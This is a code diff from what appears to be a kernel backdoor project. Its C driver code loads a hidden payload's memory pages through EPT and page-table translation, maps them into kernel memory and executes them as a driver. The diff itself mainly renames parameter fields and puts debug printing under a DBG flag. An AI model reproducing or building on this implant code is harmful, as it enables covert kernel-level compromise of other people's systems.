@@ -53,6 +53,9 @@ void bd_yeld(void)
 
 void bd_printf(char *format, ...)
 {
+
+#ifdef DBG
+
     func_vsprintf f_vsprintf = (func_vsprintf)ImportGetProcAddress(I_MODULE_NT, H_vsprintf);
 
     if (f_vsprintf)
@@ -66,6 +69,9 @@ void bd_printf(char *format, ...)
 
         I_DbgPrint(buff);
     }
+
+#endif
+
 }
 //--------------------------------------------------------------------------------------
 PDRIVER_OBJECT PayloadAllocDrvObj(PDRIVER_INITIALIZE DriverInit)
@@ -148,7 +154,7 @@ BOOLEAN PayloadMakeExecutable(uint64_t EptAddr, PVOID Mem, ULONG MemSize)
 //--------------------------------------------------------------------------------------
 PVOID PayloadAlloc(uint64_t EptAddr)
 {    
-    ULONG MemSize = m_Params.PayloadPagesCount * PAGE_SIZE;
+    ULONG MemSize = m_Params.payload_pages_count * PAGE_SIZE;
 
     // allocate memory for the payload
     PVOID Mem = I_MmAllocateNonCachedMemory(MemSize);
@@ -179,22 +185,22 @@ PVOID PayloadRun(uint64_t EptAddr)
     NTSTATUS Status = STATUS_UNSUCCESSFUL;
 
     PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)
-        RVATOVA(m_Params.DriverBase, ((PIMAGE_DOS_HEADER)m_Params.DriverBase)->e_lfanew);
+        RVATOVA(m_Params.driver_base, ((PIMAGE_DOS_HEADER)m_Params.driver_base)->e_lfanew);
 
     // allocate memory for the payload data
-    ULONG DataSize = m_Params.PayloadPagesCount * PAGE_SIZE;
+    ULONG DataSize = m_Params.payload_pages_count * PAGE_SIZE;
     PVOID Data = I_ExAllocatePool(NonPagedPool, DataSize);
     if (Data == NULL)
     {
         goto _end;
     }    
 
-    for (ULONG i = 0; i < m_Params.PayloadPagesCount; i += 1)
+    for (ULONG i = 0; i < m_Params.payload_pages_count; i += 1)
     {
-        uint64_t PhysAddr = 0, Addr = (uint64_t)m_Params.PayloadBase + (PAGE_SIZE * i);
+        uint64_t PhysAddr = 0, Addr = (uint64_t)m_Params.payload_base + (PAGE_SIZE * i);
 
         // get physical address of the payload page
-        if (backdoor_virt_translate(Addr, &PhysAddr, m_Params.PayloadCr3, m_Params.PayloadEpt) != 0)
+        if (backdoor_virt_translate(Addr, &PhysAddr, m_Params.payload_pml4, m_Params.payload_ept) != 0)
         {
             DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: backdoor_virt_translate() fails\n");
             goto _end;
@@ -208,7 +214,7 @@ PVOID PayloadRun(uint64_t EptAddr)
         }        
     }
 
-    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): %d payload memory pages read\n", m_Params.PayloadPagesCount);
+    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): %d payload memory pages read\n", m_Params.payload_pages_count);
 
     pHeaders = (PIMAGE_NT_HEADERS)
         RVATOVA(Data, ((PIMAGE_DOS_HEADER)Data)->e_lfanew);
@@ -331,7 +337,7 @@ void DriverMain(void)
                         cr3_get(), EptAddr
                     );
 
-                    if (m_Params.PayloadBase != NULL)
+                    if (m_Params.payload_base != NULL)
                     {
                         // load and execute payload
                         ImageAddr = PayloadRun(EptAddr);
